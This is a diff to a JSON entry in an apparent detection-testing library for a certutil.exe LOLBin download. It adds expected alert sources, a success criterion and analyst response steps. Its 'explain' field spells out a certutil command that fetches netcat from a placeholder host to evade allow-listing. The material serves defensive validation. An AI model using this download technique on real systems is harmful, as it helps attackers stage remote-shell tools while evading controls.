@@ -185,6 +185,34 @@
         "proxy",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "defender-endpoint",
+          "description": "Living off the Land - LOLBin Transfers - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "proxy",
+          "description": "Living off the Land - LOLBin Transfers (2) - Splunk"
+        },
+        {
+          "source": "sysmon",
+          "description": "proc_creation_win_lolbin_certutil_download"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review Microsoft Defender for Endpoint, Sysmon, Web proxy logs for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Downloads a file using certutil.exe, a trusted signed Windows binary, to dodge app allow-listing:\n  -urlcache   use the URL cache download path\n  -split      write the raw file (split off the cert wrapper)\n  -f          force overwrite / refetch\n  http://<ip>:8000/nc.exe nc.exe   remote source and local filename\nThe download looks like normal signed-binary activity; bitsadmin, certreq, and other LOLBAS entries do the same job."
